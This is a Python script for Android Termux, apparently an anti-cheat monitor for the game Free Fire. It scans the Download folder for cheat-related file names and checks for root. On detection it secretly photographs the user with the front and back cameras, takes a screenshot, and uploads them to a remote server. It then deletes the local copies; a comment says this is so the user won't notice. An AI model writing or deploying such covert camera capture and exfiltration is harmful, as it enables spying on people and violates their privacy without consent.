import os, time, subprocess, requests, platform, psutil, hashlib, json, threading

# --- KONFIGURASI ---
URL_HOSTING = "http://god-eye.my.id/index.php" 
AUTH_TOKEN = "DEWA_SIG_2026_XYZ"

FORBIDDEN_KEYWORDS = ["antena", "headshot", "aimlock", "regedit", "modmenu", "bypass", "injector", "ffh4x", "ruok", "cheat", "hack"]

def capture_all_evidence():
    evidences = {}
    
    # 1. Screenshot Layar
    ss_name = f"ss_{int(time.time())}.png"
    subprocess.run(["termux-screenshot", ss_name], capture_output=True)
    if os.path.exists(ss_name):
        evidences["ss"] = open(ss_name, "rb")

    # 2. Foto Kamera Belakang (ID: 0 biasanya belakang)
    cam_back = f"back_{int(time.time())}.jpg"
    subprocess.run(["termux-camera-photo", "-c", "0", cam_back], capture_output=True)
    if os.path.exists(cam_back):
        evidences["cam_back"] = open(cam_back, "rb")

    # 3. Foto Kamera Depan (ID: 1 biasanya depan)
    cam_front = f"front_{int(time.time())}.jpg"
    subprocess.run(["termux-camera-photo", "-c", "1", cam_front], capture_output=True)
    if os.path.exists(cam_front):
        evidences["cam_front"] = open(cam_front, "rb")

    return evidences, [ss_name, cam_back, cam_front]

def get_hwid():
    raw = f"{platform.machine()}{platform.processor()}{platform.node()}"
    return hashlib.md5(raw.encode()).hexdigest()[:8].upper()

def scan():
    score = 10
    det = []
    # Cek Root
    if os.path.exists("/data/adb/magisk") or os.path.exists("/system/bin/su"):
        return 100, ["DEVICE_ROOTED"]
    # Cek File
    path = "/sdcard/Download"
    if os.path.exists(path):
        for f in os.listdir(path):
            if any(k in f.lower() for k in FORBIDDEN_KEYWORDS):
                det.append(f"FILE:{f}"); score += 50
    return min(score, 100), list(set(det))

def main():
    os.system('clear')
    print("\033[92m[+] GOD-EYE ULTIMATE MONITORING ACTIVE\033[0m")
    nick = input("Input Nickname: ")
    hwid = get_hwid()

    while True:
        score, findings = scan()
        details = ", ".join(findings) if findings else "CLEAN"
        files_to_upload = {}
        paths_to_clean = []

        # Ambil bukti foto jika terdeteksi cheat
        if score >= 90:
            print("\033[91m[!] MENGAMBIL FOTO BUKTI (FRONT/BACK)...\033[0m")
            files_to_upload, paths_to_clean = capture_all_evidence()

        # Kirim ke Dashboard
        try:
            payload = {
                "auth_token": AUTH_TOKEN, 
                "nickname": nick, 
                "score": score, 
                "details": details, 
                "device": hwid
            }
            # Kirim semua file (SS, Foto Depan, Foto Belakang)
            response = requests.post(URL_HOSTING, data=payload, files=files_to_upload, timeout=20, verify=False)
            print(f"[*] Status: Synced | Score: {score}%")
            
            # Bersihkan file di HP agar tidak ketahuan
            for f in files_to_upload.values(): f.close()
            for p in paths_to_clean:
                if os.path.exists(p): os.remove(p)

            if score >= 101: # 101 agar tester tidak mati
                subprocess.run(["am", "force-stop", "com.dts.freefireth"], capture_output=True)
                os._exit(0)
        except Exception as e:
            print(f"Sync Error: {e}")
            
        time.sleep(10)

if __name__ == "__main__":
    main()
